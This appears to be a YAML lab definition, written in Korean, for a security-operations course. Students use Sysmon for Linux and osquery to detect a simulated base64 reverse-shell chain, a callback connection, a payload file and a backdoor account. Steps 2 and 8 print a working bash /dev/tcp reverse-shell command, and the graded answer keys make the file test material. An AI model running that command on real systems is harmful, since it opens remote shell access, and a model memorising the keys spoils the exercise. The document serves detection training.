@@ -1,0 +1,370 @@
+lab_id: standalone-secuops-week11
+title: "호스트의 비행기록장치 — Sysmon for Linux: 리버스셸·인코딩 명령의 '그 순간'"
+version: standalone-secuops
+course: secuops
+week: 11
+description: |
+  Sysmon for Linux(eBPF)를 el34 호스트(192.168.0.151)에 설치해 호스트 커널의 이벤트 스트림을 잡는다.
+  컨테이너 프로세스는 호스트 커널 프로세스이므로 호스트 sysmon이 el34-web 내부 활동(ProcessCreate/
+  NetworkConnect/FileCreate)까지 포착한다. base64 리버스셸 사슬을 재현하고, osquery 스냅샷이 놓치는
+  단명·인코딩 프로세스를 sysmon 이벤트로 잡는 대비를 직접 본다.
+  공격은 `docker exec el34-web …`, sysmon 관측은 호스트의 `/var/log/syslog`(ccc=adm 그룹, sudo 불필요).
+  sysmon 자체는 영속 인프라(유지). 실습이 만든 계정/파일/프로세스만 self-clean.
+difficulty: hard
+duration_minutes: 200
+prerequisites:
+  - "W07(osquery 스냅샷) · W09–W10(Wazuh) 통과"
+  - "el34 호스트 SSH(ssh ccc@192.168.0.151) + docker exec"
+  - "lecture §1(스냅샷 vs 이벤트) §5(ProcessCreate) §6-§7(Net/File) 숙지"
+objectives:
+  - "호스트 sysmon 데몬 + config(3 event) + syslog 소스 확인"
+  - "base64 리버스셸 페이로드 디코드"
+  - "ProcessCreate(1)로 단명·인코딩 프로세스 포착 + osquery 스냅샷 한계 대비"
+  - "NetworkConnect(3) 콜백 + FileCreate(11) 페이로드 event 확인"
+  - "persistence(백도어 계정)는 osquery 스냅샷으로 + 역할 구분"
+pass_threshold: 0.7
+steps:
+
+  - order: 1
+    instruction: |
+      ## 🎯 점검 — 호스트 sysmon(비행기록장치)이 돌고 있나
+
+      el34 호스트에 Sysmon for Linux가 데몬으로 가동되고, RuleGroup(필터)과 syslog 적재가 살아있는지 본다.
+
+      ## 💻 실행 명령 (호스트에서)
+      ```bash
+      systemctl is-active sysmon
+      sysmon -c 2>/dev/null | grep -E "ProcessCreate|NetworkConnect|FileCreate" | head
+      grep -ac "Linux-Sysmon" /var/log/syslog
+      ```
+      ## ✅ 합격 기준
+      sysmon `active` + config에 3 event + syslog에 `Linux-Sysmon` 적재.
+    hint: 'systemctl is-active sysmon + sysmon -c + grep Linux-Sysmon /var/log/syslog'
+    category: survey
+    points: 10
+    answer: |
+      echo "=== sysmon 데몬 ==="
+      systemctl is-active sysmon
+      echo "=== config event 종류 ==="
+      sysmon -c 2>/dev/null | grep -E "ProcessCreate|NetworkConnect|FileCreate" | head
+      echo "=== syslog 적재량 ==="
+      grep -ac "Linux-Sysmon" /var/log/syslog
+    answer_detail: "Sysmon for Linux는 eBPF 센서로 호스트 커널 이벤트를 잡아 /var/log/syslog에 Linux-Sysmon XML로 기록. 컨테이너 프로세스도 호스트 커널 프로세스라 함께 포착. ccc는 adm 그룹이라 sudo 없이 syslog 읽음."
+    verify:
+      type: output_contains
+      expect: 'active'
+      field: stdout
+      semantic:
+        intent: "호스트 sysmon 데몬/설정/적재 가용성 점검"
+        success_criteria: ["sysmon active", "config 3 event(Process/Network/File)", "syslog Linux-Sysmon 적재"]
+        acceptable_methods:
+          - "**[OSS] systemctl + sysmon -c + syslog grep (권장)**"
+          - "**[설명] 호스트 sysmon이 컨테이너까지 포착하는 원리**"
+    target_vm: siem
+
+  - order: 2
+    instruction: |
+      ## 🎯 base64 리버스셸 페이로드 디코드
+
+      공격자가 인코딩한 명령의 진짜 의도를 디코드로 밝힌다.
+
+      ## 💻 실행 명령
+      ```bash
+      echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMC4zMC4yMDIvNTM2NjYgMD4mMQo=' | base64 -d
+      ```
+      ## ✅ 합격 기준
+      디코드 결과가 `/dev/tcp/...53666` 리버스셸임이 드러난다.
+    hint: 'base64 -d 로 페이로드 디코드 → /dev/tcp 리버스셸'
+    category: analysis
+    points: 10
+    answer: |
+      echo "=== base64 페이로드 디코드 ==="
+      echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMC4zMC4yMDIvNTM2NjYgMD4mMQo=' | base64 -d
+      echo ""
+      echo "→ bash 리버스셸: /dev/tcp/10.20.30.202/53666 로 셸을 되돌림"
+    answer_detail: "base64로 위장한 명령을 -d로 디코드하면 'bash -i >& /dev/tcp/10.20.30.202/53666 0>&1' 리버스셸이 드러난다. sysmon ProcessCreate는 이 디코딩/실행 명령의 cmdline을 event로 남긴다."
+    verify:
+      type: output_contains
+      expect: 'dev/tcp'
+      field: stdout
+      semantic:
+        intent: "인코딩된 리버스셸 페이로드 디코드로 의도 파악"
+        success_criteria: ["base64 -d 디코드", "/dev/tcp 리버스셸 식별", "포트 53666"]
+        acceptable_methods:
+          - "**[OSS] base64 -d (권장)**"
+          - "**[설명] 인코딩 회피 기법**"
+    target_vm: siem
+
+  - order: 3
+    instruction: |
+      ## 🎯 ProcessCreate(EventID 1) — 단명·인코딩 프로세스: sysmon vs osquery
+
+      el34-web 안에서 인코딩 명령을 **짧게** 실행한다. osquery 스냅샷은 이미 죽은 프로세스를 못 찾지만,
+      sysmon은 **생성된 순간**의 cmdline을 syslog에 남겨놓았다 — 이것이 이벤트 스트림의 핵심.
+
+      ## 💻 실행 명령
+      ```bash
+      docker exec el34-web python3 -c "import base64; base64.b64decode('aGk=')  # w11 revshell sim"
+      sleep 2
+      echo "[osquery 스냅샷 — 이미 종료 → 못 찾음]"
+      docker exec el34-web osqueryi --json 'SELECT pid,cmdline FROM processes WHERE cmdline LIKE "%b64decode%";'
+      echo "[sysmon — 생성 순간이 syslog에 남음]"
+      grep -a "Linux-Sysmon" /var/log/syslog | grep -a "b64decode" | tail -1 | grep -ao "CommandLine>[^<]*"
+      ```
+      ## ✅ 합격 기준
+      sysmon syslog에 `b64decode` 인코딩 명령의 ProcessCreate가 남아 있다(osquery는 빈 결과).
+    hint: '단명 인코딩 프로세스 → osquery 빈결과 vs sysmon syslog 포착(b64decode)'
+    category: detect
+    points: 18
+    answer: |
+      docker exec el34-web python3 -c "import base64; base64.b64decode('aGk=')  # w11 revshell sim" 2>/dev/null
+      sleep 2
+      echo "=== osquery 스냅샷 (이미 종료된 프로세스 → 못 찾음) ==="
+      docker exec el34-web osqueryi --json 'SELECT pid,cmdline FROM processes WHERE cmdline LIKE "%b64decode%";'
+      echo "=== sysmon ProcessCreate (생성 순간 syslog에 보존) ==="
+      grep -a "Linux-Sysmon" /var/log/syslog | grep -a "b64decode" | tail -1 | grep -ao "CommandLine>[^<]*" | head -1
+    answer_detail: "핵심 대비 — 단명/인코딩 프로세스는 osquery 스냅샷(조사 시점에 살아있어야 보임)이 놓치지만, sysmon ProcessCreate(EventID 1)는 생성된 그 순간의 전체 cmdline을 남긴다. 죽은 뒤에도 추적 가능. sysmon의 존재 이유."
+    verify:
+      type: output_contains
+      expect: 'b64decode'
+      field: stdout
+      semantic:
+        intent: "단명·인코딩 프로세스를 sysmon ProcessCreate로 포착(osquery 스냅샷 한계 대비)"
+        success_criteria: ["osquery 빈 결과(종료된 프로세스)", "sysmon syslog에 b64decode cmdline", "이벤트 스트림 vs 스냅샷 이해"]
+        acceptable_methods:
+          - "**[OSS] sysmon syslog grep vs osquery processes (권장)**"
+          - "**[설명] 단명 프로세스 = 스냅샷 사각**"
+    target_vm: web
+
+  - order: 4
+    instruction: |
+      ## 🎯 NetworkConnect(EventID 3) — 콜백 연결의 순간
+
+      리버스셸 콜백 포트(53666)로의 연결을 sysmon이 NetworkConnect event로 남기는지 본다.
+
+      ## 💻 실행 명령
+      ```bash
+      nohup python3 -m http.server 53666 --bind 127.0.0.1 >/dev/null 2>&1 &
+      sleep 1
+      curl -s -o /dev/null http://127.0.0.1:53666/   # 콜백 연결 모사
+      pkill -f "http.server 53666"
+      sleep 2
+      grep -a "Linux-Sysmon" /var/log/syslog | grep -a "<EventID>3<" | grep -a "53666" | tail -1 | cut -c1-160
+      ```
+      ## ✅ 합격 기준
+      sysmon syslog에 포트 `53666` 대상 NetworkConnect(EventID 3)가 남는다.
+    hint: '리스너 53666 + 연결 → sysmon EventID 3 (DestinationPort 53666)'
+    category: detect
+    points: 16
+    answer: |
+      nohup python3 -m http.server 53666 --bind 127.0.0.1 >/dev/null 2>&1 &
+      sleep 1
+      curl -s -o /dev/null http://127.0.0.1:53666/ 2>/dev/null
+      pkill -f "http.server 53666" 2>/dev/null
+      sleep 2
+      echo "=== sysmon NetworkConnect (포트 53666) ==="
+      grep -a "Linux-Sysmon" /var/log/syslog | grep -a "<EventID>3<" | grep -a "53666" | tail -1 | cut -c1-200
+    answer_detail: "콜백 포트 53666 연결을 sysmon이 NetworkConnect(EventID 3)로 포착 — 어느 프로세스가 어디로 연결했는지 호스트 내부 관점. Suricata(네트워크 경계)와 상호 보완. 실제 리버스셸이면 el34-web 프로세스가 외부로 연결하고 호스트 sysmon이 그 순간을 잡는다."
+    verify:
+      type: output_contains
+      expect: '53666'
+      field: stdout
+      semantic:
+        intent: "콜백 연결을 sysmon NetworkConnect로 포착"
+        success_criteria: ["EventID 3 NetworkConnect", "DestinationPort 53666", "프로세스↔연결 관점"]
+        acceptable_methods:
+          - "**[OSS] sysmon EventID 3 syslog grep (권장)**"
+          - "**[설명] sysmon(호스트) vs Suricata(경계) 보완**"
+    target_vm: siem
+
+  - order: 5
+    instruction: |
+      ## 🎯 FileCreate(EventID 11) — 페이로드가 떨어지는 순간
+
+      페이로드 파일 생성도 sysmon event로 남는다(곧바로 지워도 생성 사실은 로그에).
+
+      ## 💻 실행 명령
+      ```bash
+      docker exec el34-web sh -c 'echo payload > /tmp/w11_payload.b64'
+      sleep 2
+      grep -a "Linux-Sysmon" /var/log/syslog | grep -a "<EventID>11<" | grep -a "w11_payload" | tail -1 | cut -c1-160
+      docker exec el34-web sh -c 'rm -f /tmp/w11_payload.b64'
+      ```
+      ## ✅ 합격 기준
+      sysmon syslog에 `w11_payload` FileCreate(EventID 11)가 남는다.
+    hint: '페이로드 drop → sysmon EventID 11 (TargetFilename w11_payload)'
+    category: detect
+    points: 14
+    answer: |
+      docker exec el34-web sh -c 'echo payload > /tmp/w11_payload.b64'
+      sleep 2
+      echo "=== sysmon FileCreate (w11_payload) ==="
+      grep -a "Linux-Sysmon" /var/log/syslog | grep -a "<EventID>11<" | grep -a "w11_payload" | tail -1 | cut -c1-200
+      docker exec el34-web sh -c 'rm -f /tmp/w11_payload.b64'
+      echo "self-clean done"
+    answer_detail: "FileCreate(EventID 11)는 페이로드 파일 생성의 순간을 남긴다 — 곧바로 삭제해도 생성 event는 syslog에 보존. Wazuh FIM realtime(W10)과 같은 발상, 다른 소스(eBPF). 파일 drop 추적의 핵심."
+    verify:
+      type: output_contains
+      expect: 'w11_payload'
+      field: stdout
+      semantic:
+        intent: "페이로드 파일 생성을 sysmon FileCreate로 포착"
+        success_criteria: ["EventID 11 FileCreate", "TargetFilename w11_payload", "삭제해도 생성 event 보존"]
+        acceptable_methods:
+          - "**[OSS] sysmon EventID 11 syslog grep (권장)**"
+          - "**[설명] FileCreate vs FIM realtime**"
+    target_vm: web
+
+  - order: 6
+    instruction: |
+      ## 🎯 persistence — 백도어 계정 (스냅샷이 강한 영역)
+
+      계정 생성은 상태가 남는 persistence라 osquery 스냅샷으로 충분히 잡힌다. 단명 프로세스(sysmon 영역)와
+      역할이 다르다.
+
+      ## 💻 실행 명령
+      ```bash
+      docker exec el34-web sh -c 'userdel -r smonbd 2>/dev/null; useradd -m -s /bin/bash smonbd && echo created'
+      docker exec el34-web osqueryi --json 'SELECT username,uid,shell FROM users WHERE username="smonbd";'
+      docker exec el34-web sh -c 'userdel -r smonbd 2>/dev/null; echo removed'
+      ```
+      ## ✅ 합격 기준
+      osquery `users` 에 `smonbd` 가 보인다(제거 후 잔재 0).
+    hint: 'useradd smonbd → osquery users → userdel'
+    category: response
+    points: 12
+    answer: |
+      docker exec el34-web sh -c 'userdel -r smonbd 2>/dev/null; useradd -m -s /bin/bash smonbd && echo created'
+      echo "=== osquery 백도어 계정 사냥 ==="
+      docker exec el34-web osqueryi --json 'SELECT username,uid,shell FROM users WHERE username="smonbd";'
+      docker exec el34-web sh -c 'userdel -r smonbd 2>/dev/null; echo removed'
+      echo "self-clean done"
+    answer_detail: "백도어 계정은 '지속 상태'라 osquery 스냅샷이 강한 영역(조사 시점에 존재하면 무조건 보임). 단명 프로세스(sysmon만 잡음)와 달리 도구 역할이 나뉜다 — sysmon=순간 이벤트, osquery=상태 스냅샷."
+    verify:
+      type: output_contains
+      expect: 'smonbd'
+      field: stdout
+      semantic:
+        intent: "persistence 계정을 osquery 스냅샷으로 포착(도구 역할 구분)"
+        success_criteria: ["users에 smonbd", "userdel self-clean", "스냅샷이 강한 영역 이해"]
+        acceptable_methods:
+          - "**[OSS] osquery users (권장)**"
+          - "**[설명] 상태 vs 이벤트 역할 분담**"
+    target_vm: web
+
+  - order: 7
+    instruction: |
+      ## 🎯 종합 분석 — sysmon(이벤트) vs osquery(스냅샷) 역할 정리
+
+      이번 주 활동을 두 도구의 관점으로 집계한다.
+
+      ## 💻 실행 명령
+      ```bash
+      echo "[sysmon 이벤트 종류별 (최근 활동)]"
+      grep -a "Linux-Sysmon" /var/log/syslog | grep -aoE "<EventID>(1|3|11)</EventID>" | sort | uniq -c
+      ```
+      ## ✅ 합격 기준
+      sysmon 이벤트(1/3/11)가 집계돼 이벤트 스트림의 다면 포착이 보인다.
+    hint: 'sysmon EventID 1/3/11 집계 — 프로세스/네트워크/파일 다면'
+    category: analysis
+    points: 8
+    answer: |
+      echo "=== sysmon 이벤트 종류별 집계 (ProcessCreate=1 / NetworkConnect=3 / FileCreate=11) ==="
+      grep -a "Linux-Sysmon" /var/log/syslog | grep -aoE "<EventID>(1|3|11)</EventID>" | sort | uniq -c
+      echo ""
+      echo "역할: sysmon=순간 이벤트(단명·인코딩 프로세스, 연결, 파일 생성) / osquery=상태 스냅샷(계정·지속 발판)"
+    answer_detail: "sysmon은 프로세스(1)·네트워크(3)·파일(11)의 '그 순간'을 다면 포착, osquery는 현재 상태를 스냅샷. 둘은 경쟁이 아니라 보완 — 단명 위협은 sysmon, 지속 상태는 osquery."
+    verify:
+      type: output_contains
+      expect: 'EventID'
+      field: stdout
+      semantic:
+        intent: "sysmon 다면 이벤트 집계 + 두 도구 역할 정리"
+        success_criteria: ["EventID 1/3/11 집계", "이벤트 vs 스냅샷 보완 관계"]
+        acceptable_methods:
+          - "**[OSS] EventID 집계 (권장)**"
+          - "**[설명] 도구 역할 분담**"
+    target_vm: siem
+
+  - order: 8
+    instruction: |
+      ## 🎯 종합 보고서 — '그 순간'을 누가 잡았나
+
+      STEP 1–7 을 이벤트 스트림 관점으로 정리한다.
+
+      ## 💻 보고서 양식
+      ```markdown
+      # el34 W11 Sysmon 보고서 (학번, 이름)
+      ## 1. 호스트 sysmon (eBPF, 컨테이너까지 포착)
+      ## 2. base64 리버스셸 사슬 (디코드 결과)
+      ## 3. sysmon이 잡은 것: ProcessCreate(인코딩 cmdline)/NetworkConnect(53666)/FileCreate(payload)
+      ## 4. osquery가 잡은 것: 백도어 계정(상태). 단명 프로세스는 못 잡음(대비)
+      ## 5. 결론: 이벤트 스트림 vs 스냅샷 — 언제 무엇을 쓰나
+      ```
+      ## ✅ 합격 기준
+      보고서에 sysmon 3 event + osquery 대비가 포함된다.
+    hint: 'ProcessCreate/NetworkConnect/FileCreate + osquery 스냅샷 대비'
+    category: report
+    points: 7
+    answer: |
+      cat <<'EOF'
+      # el34 W11 Sysmon 보고서
+      ## 1. 호스트 sysmon(eBPF): 컨테이너 프로세스까지 포착, syslog Linux-Sysmon
+      ## 2. base64 리버스셸: bash -i >& /dev/tcp/10.20.30.202/53666
+      ## 3. sysmon 이벤트 스트림
+      | EventID | 종류 | 포착 |
+      |---------|------|------|
+      | 1 | ProcessCreate | 인코딩 cmdline(b64decode) — 단명도 포착 |
+      | 3 | NetworkConnect | 콜백 포트 53666 |
+      | 11 | FileCreate | 페이로드 /tmp/w11_payload.b64 |
+      ## 4. osquery 스냅샷: 백도어 계정 smonbd(상태). 단, 단명 인코딩 프로세스는 놓침
+      ## 5. 결론: 단명·인코딩·삭제된 흔적 = sysmon(이벤트), 지속 상태(계정/발판) = osquery(스냅샷). 보완 관계
+      EOF
+    answer_detail: "sysmon(이벤트 스트림)과 osquery(스냅샷)는 보완. '그 순간'(단명 프로세스/연결/파일 생성)은 sysmon이, 현재 상태(계정/지속 발판)는 osquery가. 호스트 가시성의 두 축."
+    verify:
+      type: output_contains
+      expect: 'ProcessCreate'
+      field: stdout
+      semantic:
+        intent: "이벤트 스트림 vs 스냅샷 종합 보고"
+        success_criteria: ["sysmon 3 event 표", "osquery 대비", "도구 선택 기준"]
+        acceptable_methods:
+          - "**[관리적] 보고서 양식 (권장)**"
+          - "**[설명] 두 축 보완**"
+    target_vm: siem
+
+  - order: 9
+    instruction: |
+      ## 🎯 정리 확인 — 실습 아티팩트 0 (sysmon은 유지)
+
+      실습이 만든 계정(smonbd)/페이로드/리스너 잔재가 없어야 한다. sysmon 데몬 자체는 영속 인프라로 유지된다.
+
+      ## 💻 확인 명령
+      ```bash
+      docker exec el34-web sh -c 'id smonbd 2>/dev/null && echo "계정 잔재!" || echo "user ok"; ls /tmp/w11_payload.b64 2>/dev/null && echo "payload 잔재!" || echo "file ok"'
+      pgrep -f "http.server 53666" && echo "리스너 잔재!" || echo "listener ok"
+      echo "sysmon(유지): $(systemctl is-active sysmon)"
+      echo "---check done---"
+      ```
+      ## ✅ 합격 기준
+      계정/payload/리스너 잔재 0 + sysmon active + `check done`.
+    hint: 'smonbd/payload/리스너 잔재 0 + sysmon 유지 확인'
+    category: cleanup
+    points: 5
+    answer: |
+      docker exec el34-web sh -c 'id smonbd 2>/dev/null && echo "계정 잔재!" || echo "user ok"; ls /tmp/w11_payload.b64 2>/dev/null && echo "payload 잔재!" || echo "file ok"'
+      pgrep -f "http.server 53666" && echo "리스너 잔재!" || echo "listener ok"
+      echo "sysmon(영속 유지): $(systemctl is-active sysmon)"
+      echo "---check done---"
+    answer_detail: "실습 아티팩트(계정/파일/리스너)는 self-clean, sysmon 데몬은 영속 인프라로 유지(다음 학생도 사용). 공유 호스트 보존 + 도구 유지의 균형."
+    verify:
+      type: output_contains
+      expect: 'check done'
+      field: stdout
+      semantic:
+        intent: "실습 아티팩트 정리 확인 (sysmon은 유지)"
+        success_criteria: ["계정/payload/리스너 잔재 0", "sysmon active 유지", "정리 의무"]
+        acceptable_methods:
+          - "**[OSS] 잔재 점검 (권장)**"
+          - "**[설명] 아티팩트 정리 vs 인프라 유지**"
+    target_vm: web
